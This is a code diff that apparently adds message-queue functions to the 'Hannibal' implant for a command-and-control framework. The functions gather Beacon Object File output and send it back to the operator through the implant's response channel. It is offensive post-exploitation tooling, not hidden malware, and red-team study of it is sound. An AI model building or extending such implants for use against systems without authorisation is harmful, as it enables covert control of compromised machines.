@@ -614,6 +614,7 @@ LPCWSTR ParseWideString(PBYTE* args) {
     *args += (length + 1) * sizeof(WCHAR); // Move past wide string and null terminator
     return string;
 }
+
 void BeaconCharToWideString(char* str, wchar_t* wideStr) {
     if (str == NULL || wideStr == NULL) {
         return; // Invalid input
@@ -631,4 +632,173 @@ void BeaconCharToWideString(char* str, wchar_t* wideStr) {
     return;
 
 }
+
+SECTION_CODE PMESSAGE_QUEUE BeaconCreateMessageQueue() {
+    // Create a new message root of the message queue.
+
+    HANNIBAL_INSTANCE_PTR
+
+    PMESSAGE_QUEUE queue = (PMESSAGE_QUEUE)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE_QUEUE));
+
+    queue->size = 0;
+    queue->content = NULL;
+    queue->next = NULL;
+
+    return queue;
+}
+
+SECTION_CODE BOOL BeaconAddMessageToQueue(PMESSAGE_QUEUE root, LPCWSTR message) {
+    // Add a new message to the queue using root as the first node
+    HANNIBAL_INSTANCE_PTR
+
+    if (!root || !message) {
+        return FALSE;
+    }
+
+    // If root has no content, use it instead of creating new node
+    if (root->content == NULL) {
+        root->size = pic_strlenW(message);
+        root->content = (LPCWSTR)hannibal_instance_ptr->Win32.HeapAlloc(
+            hannibal_instance_ptr->Win32.GetProcessHeap(),
+            HEAP_ZERO_MEMORY,
+            (root->size + 1) * sizeof(WCHAR)
+        );
+        if (!root->content) {
+            return FALSE;
+        }
+        pic_strcatW(root->content, message);
+        return TRUE;
+    }
+
+    // Create new message node
+    PMESSAGE_QUEUE current = root;
+    while (current->next != NULL) {
+        current = current->next;
+    }
+
+    // Add new node at the end
+    PMESSAGE_QUEUE newMessage = (PMESSAGE_QUEUE)hannibal_instance_ptr->Win32.HeapAlloc(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        sizeof(MESSAGE_QUEUE)
+    );
+    if (!newMessage) {
+        return FALSE;
+    }
+
+    newMessage->size = pic_strlenW(message);
+    newMessage->content = (LPCWSTR)hannibal_instance_ptr->Win32.HeapAlloc(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        (newMessage->size + 1) * sizeof(WCHAR)
+    );
+    if (!newMessage->content) {
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), 0, newMessage);
+        return FALSE;
+    }
+    
+    pic_strcatW(newMessage->content, message);
+    current->next = newMessage;
+    return TRUE;
+}
+
+// SECTION_CODE BOOL _BeaconHannibalResponse(LPCWSTR message, LPCSTR task_uuid) {
+//     // Just a wrapper over task_enqueue. Do not suppose to be used outside of this file.
+//     HANNIBAL_INSTANCE_PTR   
+
+//     TASK response_t; 
+//     response_t.output = (LPCSTR)message;
+//     response_t.output_size = (pic_strlenW(message) + 1) * sizeof(WCHAR);
+//     response_t.task_uuid = task_uuid; // Freed in mythic_http_post_tasks()
+
+//     task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);
+//     return TRUE;
+// }
+
+SECTION_CODE BOOL BeaconCleanUpMessageQueue(PMESSAGE_QUEUE root) {
+    // Clean up the entire queue including root node
+    HANNIBAL_INSTANCE_PTR
+
+    if (!root) {
+        return FALSE;
+    }
+
+    PMESSAGE_QUEUE current = root;
+    PMESSAGE_QUEUE next;
+
+    while (current != NULL) {
+        next = current->next;
+        if (current->content) {
+            hannibal_instance_ptr->Win32.HeapFree(
+                hannibal_instance_ptr->Win32.GetProcessHeap(), 
+                0, 
+                current->content
+            );
+        }
+        hannibal_instance_ptr->Win32.HeapFree(
+            hannibal_instance_ptr->Win32.GetProcessHeap(), 
+            0, 
+            current
+        );
+        current = next;
+    }
+
+    return TRUE;
+}
+
+SECTION_CODE BOOL BeaconSendAllMessages(PMESSAGE_QUEUE root, LPCSTR task_uuid) {
+    // Concatenate and send all messages starting from root
+    HANNIBAL_INSTANCE_PTR
+
+    if (!root || !task_uuid) {
+        return FALSE;
+    }
+
+    // Calculate total size including root's content
+    int totalSize = 0;
+    PMESSAGE_QUEUE current = root;
+    
+    while (current != NULL) {
+        if (current->content) {
+            totalSize += current->size;
+        }
+        current = current->next;
+    }
+
+    // Add space for null terminator
+    totalSize += sizeof(WCHAR);
+
+    // Allocate memory for concatenated message
+    wchar_t* concatenatedMessage = (wchar_t*)hannibal_instance_ptr->Win32.HeapAlloc(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        totalSize * sizeof(WCHAR)
+    );
+
+    if (!concatenatedMessage) {
+        return FALSE;
+    }
+
+    // Concatenate messages including root's content
+    current = root;
+    while (current != NULL) {
+        if (current->content) {
+            BeaconStrcatW(concatenatedMessage, current->content);
+        }
+        current = current->next;
+    }
+
+    // Send concatenated message
+    hannibal_response(concatenatedMessage, task_uuid);
+
+    // Cleanup
+    hannibal_instance_ptr->Win32.HeapFree(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        0,
+        concatenatedMessage
+    );
+    return TRUE;
+}
+
+
 #pragma GCC pop_options
